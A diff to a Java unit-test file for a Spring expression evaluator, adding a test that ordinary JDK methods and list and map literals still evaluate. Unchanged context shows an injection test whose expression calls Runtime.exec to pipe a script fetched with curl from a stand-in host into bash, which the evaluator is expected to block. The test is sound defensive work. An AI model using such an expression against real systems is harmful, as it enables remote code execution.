@@ -9,6 +9,7 @@ import org.springframework.expression.common.TemplateParserContext;
 import org.springframework.expression.spel.support.StandardEvaluationContext;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 class SpringExpressionEvaluatorTests {
@@ -57,6 +58,16 @@ class SpringExpressionEvaluatorTests {
         String expression = "T(java.lang.Runtime).getRuntime().exec('curl http://examle.com/1.sh | bash')";
         BaseException exception = Assertions.assertThrows(BaseException.class, () -> SpringExpressionEvaluator.DEFAULT.eval(expression));
         Assertions.assertEquals("不允许调用 class name = java.lang.Runtime 的方法", exception.getMessage());
+    }
+
+    @Test
+    @SuppressWarnings("unchecked")
+    void testJdkClassMethods() {
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        Assertions.assertEquals("A", SpringExpressionEvaluator.DEFAULT.eval("'a'.toUpperCase()", context));
+        Assertions.assertEquals(1, (Integer) SpringExpressionEvaluator.DEFAULT.eval("1.02.intValue()", context));
+        Assertions.assertEquals(4, ((List<Integer>) SpringExpressionEvaluator.DEFAULT.eval("{1, 2, 3, 4}", context)).size());
+        Assertions.assertEquals(3, ((Map<Object, Object>) SpringExpressionEvaluator.DEFAULT.eval("{'a': 1, 'b': 2, 'c': 3}", context)).size());
     }
 
     @Test
